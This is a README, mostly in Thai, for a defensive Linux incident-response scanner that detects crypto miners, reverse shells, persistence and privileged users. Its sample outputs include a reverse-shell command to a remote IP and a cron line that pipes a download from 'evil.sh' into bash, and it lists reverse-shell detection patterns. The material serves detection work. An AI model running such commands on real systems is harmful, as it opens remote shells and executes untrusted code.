
# SOC Scanner v17

SOC Scanner v17 เป็น **Portable Linux SOC / Incident Response Scanner** สำหรับตรวจสอบความเสี่ยงของ Server เช่น

- Malware / Crypto Miner
- Reverse Shell
- Suspicious Ports
- Suspicious Processes
- Privileged Users
- Persistence Mechanisms
- Container Malware
- Suspicious Files

ออกแบบมาให้สามารถใช้งานได้กับหลาย environment และสามารถรันจาก GitHub ได้โดยตรง

---

# โครงสร้างโปรเจกต์

```
soc_scanner_v17
│
├── run
├── socscan.sh
├── install.sh
├── README.md
│
├── modules
│   ├── runtime.sh
│   ├── network.sh
│   ├── ports.sh
│   ├── process_tree.sh
│   ├── reverse_shell.sh
│   ├── docker.sh
│   ├── users.sh
│   ├── persistence.sh
│   ├── rootkit.sh
│   └── entropy.sh
│
└── ioc
    └── malicious_ips.txt
```

---

# วิธีติดตั้ง

## วิธีที่ 1 Clone จาก GitHub

```
git clone https://github.com/YOURUSER/soc_scanner.git
cd soc_scanner
sudo bash socscan.sh --all
```

---

## วิธีที่ 2 Run จาก GitHub โดยตรง

```
bash <(curl -s https://raw.githubusercontent.com/YOURUSER/soc_scanner/main/run) --all
```

---

## วิธีที่ 3 Install เป็น command

```
sudo bash install.sh
```

หลังจากติดตั้งแล้วสามารถใช้คำสั่ง

```
socscan --all
```

---

# คำสั่งการใช้งาน

## Scan ทุก module

```
socscan --all
```

---

## Runtime Scan

ตรวจสอบ

- RAM usage
- CPU usage
- Top processes

```
socscan --runtime
```

### Output

```
[Runtime Scan]

Memory usage:
total used free

Top CPU Processes
PID USER %CPU %MEM COMMAND
4821 www-data 88 xmrig
```

---

## Network Scan

ตรวจสอบ

- Active network connections
- Suspicious outbound connections

```
socscan --network
```

### Output

```
[Network Connections]

ESTAB 10.0.0.5:44122 -> 185.220.101.23:3333
```

---

## Port Scan

ตรวจสอบ

- Open ports
- Listening services

```
socscan --ports
```

### Output

```
[Listening Ports]

tcp LISTEN 0.0.0.0:22 ssh
tcp LISTEN 0.0.0.0:3333 xmrig
```

---

## Process Tree

ตรวจสอบ parent process chain

```
socscan --process
```

### Output

```
[Process Tree]

sshd
 └─bash
   └─xmrig
```

---

## Reverse Shell Detection

ตรวจ pattern เช่น

- bash -i
- nc -e
- /dev/tcp
- python pty

```
socscan --reverse-shell
```

### Output

```
[Reverse Shell Detection]

bash -i >& /dev/tcp/185.220.101.5/4444
```

---

## Docker Scan

ตรวจ container ที่กำลังทำงาน

```
socscan --docker
```

### Output

```
[Docker Scan]

CONTAINER ID IMAGE COMMAND
miner01 ubuntu:latest
```

---

## User Privilege Scan

ตรวจ user ที่มี UID = 0

```
socscan --users
```

### Output

```
[UID 0 Users]

root:x:0:0
backupadmin:x:0:0
```

---

## Persistence Detection

ตรวจ persistence mechanism เช่น

- cron jobs
- systemd services

```
socscan --persistence
```

### Output

```
[Persistence Scan]

*/5 * * * * curl http://evil.sh | bash
```

---

## Rootkit Scan

ตรวจ kernel modules ที่โหลดอยู่

```
socscan --rootkit
```

### Output

```
[Kernel Modules]

module_name size used
```

---

## Suspicious File Scan

ตรวจไฟล์ที่มีขนาดใหญ่ผิดปกติใน

- /tmp
- /var/tmp

```
socscan --entropy
```

### Output

```
[Suspicious Files]

/tmp/.x/miner
/tmp/backdoor
```

---

# Fleet Scan (หลาย server)

สร้างไฟล์

```
servers.txt
```

ตัวอย่าง

```
server1
server2
server3
```

รันคำสั่ง

```
socscan --fleet servers.txt
```

scanner จะ

- SSH เข้าแต่ละเครื่อง
- Run scanner
- Collect output

---

# ตัวอย่าง Full Scan

```
SOC Scanner v17
Host: web01

[Runtime Scan]
Memory usage: 70%

[Network Connections]
ESTAB 10.0.0.5:44122 -> 185.220.101.23:3333

[Listening Ports]
tcp LISTEN 0.0.0.0:3333 xmrig

[Process Tree]
sshd
 └─bash
   └─xmrig

[Reverse Shell Detection]
bash -i >& /dev/tcp/185.220.101.5/4444

[Docker Scan]
miner01 container running

[UID 0 Users]
backupadmin:x:0:0
```

---

# Security Coverage

SOC Scanner v17 สามารถตรวจจับ

- Crypto Miner
- Reverse Shell
- Suspicious Ports
- Privileged Users
- Persistence
- Container Malware
- Suspicious Files
- Resource Abuse

---

# Use Cases

เหมาะสำหรับ

- Incident Response
- Security Audit
- Server Triage
- SOC Investigation

---

# Roadmap

Feature ที่จะเพิ่มในเวอร์ชันถัดไป

- IOC Threat Intelligence
- Country Geolocation
- Ransomware Entropy Detection
- Hidden Process Detection
- Advanced Rootkit Detection
- SIEM JSON Output
- Incident Report Generator
